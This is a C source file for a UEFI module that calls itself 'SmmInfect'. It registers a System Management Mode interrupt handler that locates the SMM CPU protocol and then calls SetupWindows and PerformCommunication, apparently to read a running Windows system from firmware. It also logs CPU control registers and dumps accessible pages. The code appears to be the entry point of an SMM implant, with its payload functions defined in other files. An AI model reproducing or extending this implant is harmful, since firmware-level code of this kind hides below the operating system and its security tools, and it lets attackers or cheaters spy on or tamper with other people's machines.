#include "ProcessorBind.h"
#include "communication.h"
#include "log_lvl.h"
#include "logging.h"
#include "memory.h"
#include "windows.h"

#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <PiDxe.h>
#include <Protocol/SmmCpu.h>
#include <Protocol/LoadedImage.h>
#include <Uefi.h>

static EFI_SMM_BASE2_PROTOCOL *SmmBase2;
static EFI_SMM_SYSTEM_TABLE2 *GSmst2;
static BOOLEAN OS = FALSE;
static EFI_SMM_CPU_PROTOCOL *Cpu = NULL;

VOID EFIAPI ClearCache();

EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID *context,
                             VOID *buffer, UINTN *size) {
    GSmst2->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID **)&Cpu);

    if (!EFI_ERROR(SetupWindows(Cpu, GSmst2))) {
        OS = TRUE;
        if (!EFI_ERROR(PerformCommunication())) {
            return EFI_SUCCESS;
        }
    }

    return EFI_SUCCESS;
}

VOID LogExecInfo(EFI_HANDLE handle) {

    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage = NULL;
    
    EFI_STATUS status = gBS->HandleProtocol(
        handle,
        &gEfiLoadedImageProtocolGuid,
        (VOID**)&LoadedImage
    );

    if (!EFI_ERROR(status)) {
        VOID* base = LoadedImage->ImageBase;
        UINT64 size = LoadedImage->ImageSize;
        LOG_INFO("[INFO] Image base = 0x%x, size = 0x%x \r\n", base, size);
    }

    UINT64 cr0 = AsmReadCr0();
    UINT64 cr4 = AsmReadCr4();
    UINT64 efer = AsmReadMsr64(0xC0000080); // IA32_EFER

    LOG_INFO("[INFO] CPU control registers: \r\n");
    LOG_INFO("EFER = 0x%x \r\n", efer);

    LOG_INFO("[INFO] Paging:          %s \r\n", (cr0 & (1ULL << 31)) ? "ENABLED" : "DISABLED");
    LOG_INFO("[INFO] PAE:             %s \r\n", (cr4 & (1ULL << 5))  ? "ENABLED" : "DISABLED");
    LOG_INFO("[INFO] Long mode:       %s \r\n", (efer & (1ULL << 8))  ? "ENABLED" : "DISABLED");

    LOG_INFO("[INFO] Cache settings:");
    LOG_INFO(" - CD (Cache Disable):  %s \r\n", (cr0 & (1ULL << 30)) ? "YES" : "NO");
    LOG_INFO(" - NW (Not Write-through): %s \r\n", (cr0 & (1ULL << 29)) ? "YES" : "NO");
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE image, IN EFI_SYSTEM_TABLE *table) {

    LOG_INFO("[HELLO] SmmInfect Initializing... \r\n");

    LogExecInfo(image);
    DumpAccessiblePages(AsmReadCr3());

    gRT = table->RuntimeServices;
    gBS = table->BootServices;
    gST = table;

    if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0,
                                      (void **)&SmmBase2))) {
        LOG_ERROR("[ERR] Couldn't localte SmmBase2Protocol \r\n");
        return EFI_SUCCESS;
    }

    if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2))) {
        LOG_ERROR("[ERR] Failed to find SMST \r\n");
        return EFI_SUCCESS;
    }

    EFI_HANDLE handle;
    GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);

    if (EFI_ERROR(SetupMemory(GSmst2))) {
        LOG_ERROR("[ERR] Failed to setup memory-map \r\n");
        return EFI_ERROR_MAJOR;
    }

    LOG_INFO("[INFO] Handler registered \r\n");

    return EFI_SUCCESS;
}

